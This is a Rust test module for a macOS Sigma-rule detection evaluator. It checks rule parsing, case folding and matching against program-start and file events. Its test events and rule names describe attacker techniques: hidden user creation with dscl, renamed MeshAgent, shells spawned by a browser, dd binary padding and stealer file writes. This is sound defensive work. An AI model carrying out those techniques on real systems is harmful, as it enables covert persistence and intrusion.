    /// A regular expression is searched for anywhere in the value, not matched against the
    /// whole of it; the specification does not say which. So "Hidden User Creation", whose
    /// expression means a user id below 500, takes any digit in the command line, and fires
    /// on id 501. Pinned so that a change in the evaluator is seen.
    #[test]
    fn regular_expressions_are_searched_not_anchored() {
        let rules = Rules::shipped();
        let create = start(
            "/usr/bin/dscl",
            &["dscl", ".", "-create", "/Users/example", "UniqueID", "501"],
            "/bin/zsh",
        );
        assert!(fires(rules, HIDDEN_USER, &create));
    }

    /// A field a program start does not give is absent, and an absent field matches nothing.
    /// The renamed-MeshAgent rule is evaluated in part, its `OriginalFileName` alternative
    /// named as never matching here: a renamed MeshAgent started without its service name is
    /// not seen, and the summary says so.
    #[test]
    fn a_field_this_level_does_not_have_never_matches_and_is_named() {
        let rules = Rules::shipped();
        assert_eq!(
            by_id(rules, RENAMED_MESHAGENT).placement,
            Placement::InPart(vec![Branch {
                selection: "selection_meshagent".into(),
                fields: vec!["OriginalFileName".into()],
            }])
        );
        let quiet = start("/tmp/.helper", &["/tmp/.helper", "-run"], "/bin/sh");
        assert!(!fires(rules, RENAMED_MESHAGENT, &quiet));
        let s = rules.summary_json();
        assert_eq!(
            s["in_part"][0]["never_matches"],
            json!([{ "selection_text": "selection_meshagent", "fields_text": ["OriginalFileName"] }])
        );
    }

    /// The browser-child rule leaves out starts without arguments with `CommandLine: ''` and
    /// `CommandLine: null`. Every start has a command line here, empty when there are no
    /// arguments, so `''` is what applies; `null` matches only a field present as null, which
    /// a start never has. A `*` inside a `contains` value is still a wildcard.
    #[test]
    fn an_empty_command_line_and_wildcards_inside_values() {
        let rules = Rules::shipped();
        let parent = "/Applications/Safari.app/Contents/MacOS/Safari";
        let shell = start("/bin/zsh", &["zsh", "-c", "id"], parent);
        assert!(fires(rules, BROWSER_CHILD, &shell));
        let bare = start("/bin/zsh", &[], parent);
        assert!(!fires(rules, BROWSER_CHILD, &bare));
        let update = start(
            "/bin/sh",
            &[
                "sh",
                "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app/Contents/MacOS/msupdate",
            ],
            parent,
        );
        assert!(!fires(rules, BROWSER_CHILD, &update));
    }

    /// File rules are about files written, and their `Image` is the writer, not a program
    /// started: they are asked only about a file event and never match a program start, even
    /// one whose fields would satisfy them; a process rule is never asked about a file event.
    /// A rule about another kind of event, which this level does not read, is not evaluated,
    /// with the reason.
    #[test]
    fn a_rule_is_asked_only_about_events_of_its_kind() {
        let rule = |category: &str| -> &'static str {
            Box::leak(
                format!(
                    "title: Invented\nid: 00000000-0000-4000-8000-000000000001\nstatus: test\n\
                     level: high\nlogsource:\n    category: {category}\n    product: macos\n\
                     detection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\n"
                )
                .into_boxed_str(),
            )
        };
        let rules = Rules::load(&[
            ("invented/file.yml", rule("file_event")),
            ("invented/process.yml", rule("process_creation")),
            ("invented/network.yml", rule("network_connection")),
        ]);
        assert_eq!(rules.rules[0].kind, Some(Kind::File));
        assert_eq!(rules.rules[1].kind, Some(Kind::Process));
        assert_eq!(
            rules.rules[2].placement,
            Placement::NotEvaluated(Reason::NeedsEvents("network_connection".into()))
        );
        let curl = start(
            "/usr/bin/curl",
            &["curl", "https://example.invalid"],
            "/bin/zsh",
        );
        let wrote = file("/usr/bin/curl", "/Users/example/.helper", None);
        let asked = |s: Subject| -> Vec<&str> {
            let fast: Vec<&str> = rules.evaluate(s).iter().map(|m| m.file).collect();
            let each: Vec<&str> = rules.evaluate_each(s).iter().map(|m| m.file).collect();
            assert_eq!(fast, each);
            fast
        };
        assert_eq!(asked(Subject::Start(&curl)), ["invented/process.yml"]);
        assert_eq!(asked(Subject::File(&wrote)), ["invented/file.yml"]);
        let m = rules.evaluate(&wrote);
        assert_eq!(m[0].kind, Kind::File);
        assert_eq!(m[0].json()["events"], "file_event");
        let shipped = Rules::shipped();
        assert!(!fires(shipped, AMOS_FILES, &curl));
        assert!(fires(shipped, AMOS_FILES, &wrote));
    }

    const HEAD: &str = "title: Invented\nid: 00000000-0000-4000-8000-000000000002\n";
    const TAIL: &str = "logsource:\n    category: process_creation\n    product: macos\n";
    const PLAIN: &str =
        "detection:\n    selection:\n        Image: '/x'\n    condition: selection\n";

    fn invented(detection: &str) -> &'static str {
        let text = format!("{HEAD}status: test\nlevel: medium\n{TAIL}detection:\n{detection}");
        Box::leak(text.into_boxed_str())
    }

    /// A selection that cannot match without a missing field makes the whole rule not
    /// evaluated, the field named; one alternative of several only makes it evaluated in part.
    /// A keyword search and a rule that cannot be read are named too.
    #[test]
    fn placement_names_what_a_rule_needs() {
        let needs = invented(
            "    selection:\n        Image|endswith: '/x'\n        User: root\n    condition: selection\n",
        );
        let part = invented(
            "    selection:\n        - Image|endswith: '/x'\n        - Hashes|contains: 'a'\n    condition: selection\n",
        );
        let keywords = invented("    keywords:\n        - 'evil'\n    condition: keywords\n");
        let broken =
            invented("    selection:\n        Image: '/x'\n    condition: selection and other\n");
        let rules = Rules::load(&[
            ("needs.yml", needs),
            ("part.yml", part),
            ("keywords.yml", keywords),
            ("broken.yml", broken),
        ]);
        assert_eq!(
            rules.rules[0].placement,
            Placement::NotEvaluated(Reason::NeedsFields(vec!["User".into()]))
        );
        assert_eq!(
            rules.rules[1].placement,
            Placement::InPart(vec![Branch {
                selection: "selection".into(),
                fields: vec!["Hashes".into()],
            }])
        );
        assert_eq!(
            rules.rules[2].placement,
            Placement::NotEvaluated(Reason::KeywordSearch)
        );
        let Placement::NotEvaluated(Reason::NotParsed(said)) = &rules.rules[3].placement else {
            panic!("a rule the evaluator cannot read is not parsed");
        };
        assert!(said.contains("other"), "{said}");
        assert!(rules.rules[3].meta.is_none());
        let x = start("/bin/x", &["x", "evil"], "/bin/zsh");
        let hit: Vec<&str> = rules.evaluate(&x).iter().map(|m| m.file).collect();
        assert_eq!(hit, ["part.yml"]);
        let s = rules.summary_json();
        assert_eq!(
            s["totals"],
            json!({ "shipped": 4, "evaluated": 0, "in_part": 1, "not_evaluated": 3 })
        );
    }

    /// A rule is evaluated only when it can be read and has an id, a level and a status of
    /// Sigma's, so that every match can be named and weighed; otherwise it is named as not
    /// parsed, with what was wrong.
    #[test]
    fn a_rule_that_cannot_be_read_is_named_with_why() {
        let leak = |s: String| -> &'static str { Box::leak(s.into_boxed_str()) };
        let rules = Rules::load(&[
            ("yaml.yml", "title: [unclosed\n"),
            (
                "id.yml",
                leak(format!(
                    "title: No id\nstatus: test\nlevel: low\n{TAIL}{PLAIN}"
                )),
            ),
            (
                "level.yml",
                leak(format!("{HEAD}status: test\n{TAIL}{PLAIN}")),
            ),
            (
                "status.yml",
                leak(format!("{HEAD}level: low\n{TAIL}{PLAIN}")),
            ),
            (
                "severe.yml",
                leak(format!("{HEAD}status: test\nlevel: severe\n{TAIL}{PLAIN}")),
            ),
        ]);
        let said: Vec<String> = rules
            .rules
            .iter()
            .map(|l| match &l.placement {
                Placement::NotEvaluated(Reason::NotParsed(said)) => said.clone(),
                other => panic!("{} is {other:?}", l.file),
            })
            .collect();
        assert!(said[0].contains("line 1"), "{}", said[0]);
        assert_eq!(said[1], "the rule has no id");
        assert_eq!(said[2], "the rule has no level");
        assert_eq!(said[3], "the rule has no status");
        assert!(said[4].contains("unknown variant `severe`"), "{}", said[4]);
        let x = start("/x", &["x"], "/bin/zsh");
        assert!(rules.evaluate(&x).is_empty());
    }

    /// The summary an agent reads has stable names, says what this level gives, and lists
    /// the most severe rules first.
    #[test]
    fn the_summary_has_stable_names() {
        let s = Rules::shipped().summary_json();
        assert_eq!(s["events"], "process_creation");
        assert_eq!(s["fields"], json!(["Image", "CommandLine", "ParentImage"]));
        assert_eq!(s["file_events"], "file_event");
        assert_eq!(s["file_fields"], json!(["TargetFilename", "Image"]));
        assert_eq!(s["source"]["commit"], COMMIT);
        assert_eq!(s["source"]["licence"], "DRL-1.1");
        let evaluated = s["evaluated"].as_array().unwrap();
        assert_eq!(evaluated[0]["level"], "high");
        assert_eq!(evaluated[evaluated.len() - 1]["level"], "informational");
        let padding = evaluated
            .iter()
            .find(|r| r["id_text"] == BINARY_PADDING)
            .unwrap();
        assert_eq!(
            padding,
            &json!({
                "file": "rules/macos/process_creation/proc_creation_macos_binary_padding.yml",
                "id_text": BINARY_PADDING,
                "title_text": "Binary Padding - MacOS",
                "level": "high",
                "status": "test",
                "events": "process_creation",
            })
        );
        let lines = Rules::shipped().summary_lines(None);
        assert!(lines[0].contains("75 shipped"));
        assert!(
            lines
                .iter()
                .any(|l| l.contains("selection_meshagent needs OriginalFileName"))
        );
        assert!(lines.iter().any(|l| l == "Evaluated in full: 74, 69 on every program start and 5 on every file created or renamed"));
    }

    /// A value as a text it stands for: a wildcard made a letter or nothing, an escape undone,
    /// as the evaluator reads them.
    fn literal(value: &str) -> String {
        let mut out = String::new();
        let mut escaped = false;
        for c in value.chars() {
            match (c, escaped) {
                ('\\', false) => escaped = true,
                ('*', false) => {}
                ('?', false) => out.push('x'),
                ('*' | '?' | '\\', true) => {
                    out.push(c);
                    escaped = false;
                }
                (c, true) => {
                    out.push('\\');
                    out.push(c);
                    escaped = false;
                }
                (c, false) => out.push(c),
            }
        }
        if escaped {
            out.push('\\');
        }
        out
    }

    /// A start and a file event that give each field the maps name its `k`-th value, or its
    /// last, placed as the field's modifiers say: what it starts with first, what it holds,
    /// what it ends with.
    fn start_from_maps(maps: &[&serde_norway::Mapping], k: usize) -> (ProcessStart, FileEvent) {
        type Parts = (Option<String>, Vec<String>, Option<String>, Option<String>);
        let mut fields: BTreeMap<&str, Parts> = BTreeMap::new();
        for (key, value) in maps.iter().flat_map(|m| m.iter()) {
            let Some(key) = key.as_str() else { continue };
            let mut it = key.split('|');
            let field = it.next().unwrap_or_default();
            let modifiers: Vec<String> = it.map(str::to_lowercase).collect();
            let has = |m: &str| modifiers.iter().any(|x| x == m);
            let values: Vec<String> = match value {
                Value::Sequence(items) => items
                    .iter()
                    .filter_map(Value::as_str)
                    .map(literal)
                    .collect(),
                v => v.as_str().map(literal).into_iter().collect(),
            };
            let Some(last) = values.last() else { continue };
            let chosen = if has("all") {
                values.join(" ")
            } else {
                values.get(k).unwrap_or(last).clone()
            };
            let parts = fields.entry(field).or_default();
            if has("startswith") {
                parts.0 = Some(chosen);
            } else if has("endswith") {
                parts.2 = Some(chosen);
            } else if has("contains") || has("re") {
                parts.1.push(chosen);
            } else {
                parts.3 = Some(chosen);
            }
        }
        let value = |field: &str| -> Option<String> {
            let (head, middle, tail, whole) = fields.get(field)?;
            if let Some(whole) = whole {
                return Some(whole.clone());
            }
            let middle = (!middle.is_empty()).then(|| middle.join(" "));
            let joined: Vec<String> = [head.clone(), middle, tail.clone()]
                .into_iter()
                .flatten()
                .collect();
            Some(joined.join(" "))
        };
        let image = value("Image").unwrap_or_else(|| "/usr/bin/true".into());
        let start = ProcessStart {
            executable: image.clone(),
            args: vec![value("CommandLine").unwrap_or_else(|| "true".into())],
            parent_executable: value("ParentImage"),
            ..ProcessStart::default()
        };
        let path = value("TargetFilename").unwrap_or_else(|| "/private/tmp/x".into());
        (start, file(&image, &path, None))
    }

    /// Starts and file events made from the shipped rules' own values: for each map of each
    /// selection, one per value; and for each rule, ones that meet every selection not named as
    /// a filter at once, as most conditions ask. So every rule meets events it matches or
    /// nearly matches: starts from the rules for program starts, file events from the rules
    /// for file events.
    fn starts_from_rules() -> (Vec<ProcessStart>, Vec<FileEvent>) {
        let widest = |map: &serde_norway::Mapping| {
            map.values()
                .map(|v| v.as_sequence().map_or(1, Vec::len))
                .max()
                .unwrap_or(1)
        };
        let (mut all_starts, mut all_files) = (Vec::new(), Vec::new());
        for (_, text) in SHIPPED {
            let yaml: Value = serde_norway::from_str(text).unwrap();
            let Some(detection) = yaml["detection"].as_mapping() else {
                continue;
            };
            let mut starts = Vec::new();
            let mut together: Vec<Vec<&serde_norway::Mapping>> = Vec::new();
            for (name, selection) in detection {
                let Some(name) = name.as_str().filter(|n| *n != "condition") else {
                    continue;
                };
                let maps: Vec<&serde_norway::Mapping> = match selection {
                    Value::Mapping(m) => vec![m],
                    Value::Sequence(items) => items.iter().filter_map(Value::as_mapping).collect(),
                    _ => vec![],
                };
                for map in &maps {
                    starts.extend((0..widest(map)).map(|k| start_from_maps(&[map], k)));
                }
                if !name.starts_with("filter") && !maps.is_empty() {
                    together.push(maps);
                }
            }
            let rounds = together.iter().flatten().map(|m| widest(m)).max();
            for k in 0..rounds.unwrap_or(0) {
                let maps: Vec<&serde_norway::Mapping> =
                    together.iter().map(|maps| maps[k % maps.len()]).collect();
                starts.push(start_from_maps(&maps, k));
            }
            let (s, f): (Vec<_>, Vec<_>) = starts.into_iter().unzip();
            if yaml["logsource"]["category"].as_str() == Some(FILE_CATEGORY) {
                all_files.extend(f);
            } else {
                all_starts.extend(s);
            }
        }
        (all_starts, all_files)
    }

    /// A start with each of its texts changed the same way.
    fn changed(s: &ProcessStart, f: impl Fn(&str) -> String) -> ProcessStart {
        ProcessStart {
            executable: f(&s.executable),
            args: s.args.iter().map(|a| f(a)).collect(),
            parent_executable: s.parent_executable.as_deref().map(&f),
            ..s.clone()
        }
    }

    /// A start with one field, by its place in `FIELDS`, changed.
    fn one_field(s: &ProcessStart, field: usize, f: impl Fn(&str) -> String) -> ProcessStart {
        let mut s = s.clone();
        match field {
            0 => s.executable = f(&s.executable),
            1 => s.args = vec![f(&s.args.join(" "))],
            _ => s.parent_executable = s.parent_executable.as_deref().map(f),
        }
        s
    }

    /// The same start written so that folding case is put to the test: in capitals; with the
    /// Kelvin sign, which folds to `k`; with `İ`, which folds to two characters; with the long
    /// s, which folds to itself; with a final sigma; one character short; with no parent and no
    /// arguments; with no texts at all. And with something before or after one field, so that
    /// where a text must stand is put to the test.
    fn variants(s: &ProcessStart) -> Vec<ProcessStart> {
        let mut no_parent = s.clone();
        no_parent.parent_executable = None;
        let mut no_args = s.clone();
        no_args.args.clear();
        let around = (0..FIELDS.len()).flat_map(|field| {
            [
                one_field(s, field, |t| format!("z {t}")),
                one_field(s, field, |t| format!("{t} z")),
            ]
        });
        around
            .chain([
                s.clone(),
                changed(s, str::to_uppercase),
                changed(s, |t| t.replace(['k', 'K'], "\u{212A}")),
                changed(s, |t| t.replace(['i', 'I'], "\u{130}")),
                changed(s, |t| t.replace('s', "\u{17F}")),
                changed(s, |t| format!("{t} ΟΔΟΣ")),
                changed(s, |t| {
                    let mut t = t.to_string();
                    t.pop();
                    t
                }),
                no_parent,
                no_args,
                changed(s, |_| String::new()),
            ])
            .collect()
    }

    /// The same file event written so that folding case and where a text stands are put to the
    /// test, each field on its own and both at once, and with the path through and around
    /// macOS's links into `/private`.
    fn file_variants(f: &FileEvent) -> Vec<FileEvent> {
        let both = |g: &dyn Fn(&str) -> String| FileEvent {
            path: g(&f.path),
            executable: g(&f.executable),
            ..f.clone()
        };
        let path = |p: String| FileEvent {
            path: p,
            ..f.clone()
        };
        let image = |e: String| FileEvent {
            executable: e,
            ..f.clone()
        };
        let short = |t: &str| {
            let mut t = t.to_string();
            t.pop();
            t
        };
        vec![
            f.clone(),
            path(format!("z {}", f.path)),
            path(format!("{} z", f.path)),
            path(format!("/private{}", f.path)),
            path(f.path.trim_start_matches("/private").to_string()),
            image(format!("z {}", f.executable)),
            image(format!("{} z", f.executable)),
            both(&str::to_uppercase),
            both(&|t| t.replace(['k', 'K'], "\u{212A}")),
            both(&|t| t.replace(['i', 'I'], "\u{130}")),
            both(&|t| t.replace('s', "\u{17F}")),
            both(&short),
            both(&|_| String::new()),
        ]
    }

    /// The fast path is the evaluator's answer, not an estimate of it: for every shipped rule
    /// and every event below, `evaluate`, which asks only the rules of its kind whose texts an
    /// event holds, gives the same matches in the same order as `evaluate_each`, which asks
    /// every rule of its kind. The events are made from each rule's own values, so that every
    /// rule meets events it matches, with their samples, the drills, and the same in every
    /// variant `variants` and `file_variants` make; a few are padded to long lines.
    #[test]
    fn asking_only_the_rules_a_start_can_match_gives_the_same_matches() {
        let rules = Rules::shipped();
        assert!(rules.texts.is_some(), "the texts' automata were built");
        let (mut base, mut files) = starts_from_rules();
        for (_, hit, miss) in high_samples() {
            base.push(hit);
            base.push(miss);
        }
        for (_, hit, miss) in file_high_samples() {
            files.push(hit);
            files.push(miss);
        }
        // A rule whose value is a regular expression meets a path it matches only when one is
        // written for it: the `.pth` rule.
        files.push(file(
            "/usr/bin/python3",
            "/Library/Frameworks/Python.framework/Versions/3.12/lib/python3.12/site-packages/x.pth",
            None,
        ));
        for (_, image, args) in DRILL {
            base.push(drill_start(image, args));
        }
        // The program starts the event level's own tests write to the log.
        let logged: [(&str, &str, &[&str]); 7] = [
            (
                "/bin/sh",
                "/bin/dd",
                &["dd", "if=/dev/zero", "bs=1", "count=9"],
            ),
            ("/bin/zsh", "/bin/dd", &["dd", "if=a", "of=b"]),
            (
                "/bin/zsh",
                "/usr/bin/sw_vers",
                &["sw_vers", "-productVersion", "m"],
            ),
            ("/bin/zsh", "/usr/bin/base64", &["base64", "-d", "in.txt"]),
            ("/bin/zsh", "/usr/bin/split", &["split", "big.bin"]),
            ("/bin/zsh", "/usr/bin/git", &["git", "status", "--short"]),
            ("/bin/zsh", "/usr/bin/curl", &["curl", "-u", "m"]),
        ];
        for (parent, image, args) in logged {
            base.push(start(image, args, parent));
        }
        let long = "a".repeat(4096);
        let padded: Vec<ProcessStart> = high_samples()
            .into_iter()
            .map(|(_, hit, _)| changed(&hit, |t| format!("{long} {t} {long}")))
            .collect();
        let mut seen = BTreeSet::new();
        base.retain(|s| {
            seen.insert((
                s.executable.clone(),
                s.args.clone(),
                s.parent_executable.clone(),
            ))
        });
        let mut seen = BTreeSet::new();
        files.retain(|f| seen.insert((f.path.clone(), f.executable.clone())));
        let corpus: Vec<ProcessStart> = base.iter().flat_map(variants).chain(padded).collect();
        let file_corpus: Vec<FileEvent> = files.iter().flat_map(file_variants).collect();

        let mut rules_matched = BTreeSet::new();
        let mut same = |s: Subject| -> usize {
            let fast: Vec<&str> = rules.evaluate(s).iter().map(|m| m.file).collect();
            let each: Vec<&str> = rules.evaluate_each(s).iter().map(|m| m.file).collect();
            assert_eq!(fast, each, "{s:?}");
            let n = each.len();
            rules_matched.extend(each);
            n
        };
        let matched: usize = corpus.iter().map(|s| same(Subject::Start(s))).sum();
        let file_matched: usize = file_corpus.iter().map(|f| same(Subject::File(f))).sum();
        // The corpus has teeth: every rule that is evaluated meets an event it matches.
        let unmatched: Vec<&str> = rules
            .rules
            .iter()
            .filter(|l| !matches!(l.placement, Placement::NotEvaluated(_)))
            .map(|l| l.file)
            .filter(|f| !rules_matched.contains(f))
            .collect();
        assert!(matched > corpus.len() / 4, "{matched} of {}", corpus.len());
        assert!(
            file_matched > file_corpus.len() / 4,
            "{file_matched} of {}",
            file_corpus.len()
        );
        assert_eq!(unmatched, Vec::<&str>::new());
    }

    /// Asking only the rules whose texts a start holds is what lets the watcher keep up with a
    /// Mac that builds, where most starts match nothing: an ordinary start asks no rule, and
    /// the drill asks its own and few others.
    #[test]
    fn a_start_asks_only_the_rules_whose_texts_it_holds() {
        let rules = Rules::shipped();
        let asked = |s: &ProcessStart| -> Vec<&str> {
            let values = Subject::Start(s).forms().remove(0);
            rules
                .asked(Kind::Process, &values)
                .iter()
                .map(|l| l.file)
                .collect()
        };
        let git = start("/usr/bin/git", &["git", "status", "--short"], "/bin/zsh");
        assert_eq!(asked(&git), Vec::<&str>::new());
        let compile = start(
            "/usr/bin/clang",
            &["clang", "-O2", "-c", "src/file1.c", "-o", "obj/file1.o"],
            "/bin/zsh",
        );
        assert_eq!(asked(&compile), Vec::<&str>::new());
        let (_, image, args) = DRILL[0];
        let dd = asked(&drill_start(image, args));
        assert!(dd.contains(&by_id(rules, BINARY_PADDING).file), "{dd:?}");
        assert!(dd.len() <= 3, "{dd:?}");
    }

    /// Case is folded one character at a time, as the evaluator folds it, not as a word is
    /// lower-cased: a capital sigma at the end of a word is a small sigma, not a final one.
    #[test]
    fn case_is_folded_one_character_at_a_time() {
        let rules = Rules::load(&[(
            "invented/sigma.yml",
            invented(
                "    selection:\n        CommandLine|contains: 'οσ'\n    condition: selection\n",
            ),
        )]);
        let s = start("/bin/echo", &["echo", "ΟΣ"], "/bin/zsh");
        assert_eq!(rules.evaluate(&s).len(), 1);
        assert_eq!(rules.evaluate_each(&s).len(), 1);
    }

    /// A condition is read for what it needs only where it is read exactly as the evaluator
    /// reads it; anything else, and whatever stands under `not`, needs nothing, so that the
    /// rule is always asked.
    #[test]
    fn a_condition_not_read_exactly_needs_nothing() {
        // `a` needs its text within the image, numbered 0, and at its end, 1; `b` its text
        // within the command line, 2; `c` names a field a start does not give, so it never
        // matches.
        let rules = |condition: &str| {
            Rules::load(&[(
                "invented/condition.yml",
                invented(&format!(
                    "    selection_a:\n        Image|endswith: '/aaa'\n    \
                     selection_b:\n        CommandLine|contains: 'bbb'\n    \
                     selection_c:\n        OriginalFileName: 'ccc'\n    \
                     condition: {condition}\n"
                )),
            )])
        };
        let need = |condition: &str| rules(condition).rules[0].need.clone();
        let a = Need::All(vec![Need::Holds(0), Need::Holds(1)]);
        let b = Need::Holds(2);
        for (condition, needs) in [
            ("selection_a", a.clone()),
            (
                "selection_a AND selection_b",
                Need::All(vec![a.clone(), b.clone()]),
            ),
            (
                "selection_a and selection_b",
                Need::All(vec![a.clone(), b.clone()]),
            ),
            ("selection_a or selection_c", a.clone()),
            ("selection_c", Need::Never),
            ("selection_a and selection_c", Need::Never),
            ("selection_a and not selection_b", a.clone()),
            ("1 of selection_*", Need::OneOf(vec![a.clone(), b.clone()])),
            ("1 of selection_a*", a.clone()),
            ("1 of *_a", a.clone()),
            ("all of selection_a*", a.clone()),
            ("ALL of them", Need::Never),
            ("1 OF them", Need::OneOf(vec![a.clone(), b.clone()])),
        ] {
            assert_eq!(need(condition), needs, "{condition}");
        }
        for condition in [
            "not selection_a",
            "selection_a or not selection_b",
            "selection_a and selection_b)",
            "1 of selection_?",
            "all of sel*_a*",
        ] {
            assert_eq!(need(condition), Need::Any, "{condition}");
        }
        // `and` binds closer than `or`, on either side.
        for condition in [
            "selection_a or selection_b and selection_a",
            "selection_a and selection_b or selection_b",
        ] {
            assert!(matches!(need(condition), Need::OneOf(_)), "{condition}");
        }
        // A selection may be called `1`, and then `1` without `of` is that selection.
        let named_one = Rules::load(&[(
            "invented/one.yml",
            invented(
                "    '1':\n        Image|endswith: '/one'\n    \
                 selection_a:\n        Image|endswith: '/aaa'\n    \
                 condition: 1 or selection_a\n",
            ),
        )]);
        let one = start("/bin/one", &["one"], "/bin/sh");
        assert_eq!(named_one.evaluate_each(&one).len(), 1);
        assert_eq!(named_one.rules[0].need, Need::Any);
    }

    /// A rule is asked only when its texts stand where they must: a value's first run at the
    /// start of the field unless something may stand before it, its last run at the end unless
    /// something may stand after it, its longest run anywhere; under `all`, every value's. A
    /// value of wildcards alone, or one that is not a string, wants no text, and its rule is
    /// asked. Where a rule is not asked, the evaluator finds no match.
    #[test]
    fn a_rule_is_asked_when_its_texts_stand_where_they_must() {
        let load = |detection: &str| {
            Rules::load(&[(
                "invented/values.yml",
                invented(&format!(
                    "    selection:\n{detection}    condition: selection\n"
                )),
            )])
        };
        let ask = |detection: &str, image: &str, command_line: &str| -> bool {
            let rules = load(detection);
            let s = start(image, &[command_line], "/bin/sh");
            let values = Subject::Start(&s).forms().remove(0);
            let asked = !rules.asked(Kind::Process, &values).is_empty();
            assert!(asked || rules.evaluate_each(&s).is_empty(), "{detection}");
            asked
        };
        let begins = "        CommandLine|startswith: 'ab*cde'\n";
        assert!(ask(begins, "/bin/x", "ab cde"));
        assert!(ask(begins, "/bin/x", "ab cde z"));
        assert!(!ask(begins, "/bin/x", "z ab cde"));
        assert!(!ask(begins, "/bin/x", "ab cd"));
        let ends = "        Image|endswith: '/xyz'\n";
        assert!(ask(ends, "/bin/xyz", "x"));
        assert!(!ask(ends, "/bin/xyz2", "x"));
        let every = "        CommandLine|contains|all:\n            - 'xyz'\n            - 'uvw'\n";
        assert!(ask(every, "/bin/x", "uvw xyz"));
        assert!(!ask(every, "/bin/x", "xyz"));
        for anything in ["        CommandLine|contains: '*'\n", "        Image: 1\n"] {
            assert!(ask(anything, "/bin/x", "z"), "{anything}");
        }
        let wildcards = load("        CommandLine|contains: '*?'\n");
        assert_eq!(wildcards.texts.as_ref().map(|t| t.count), Some(0));
    }
}
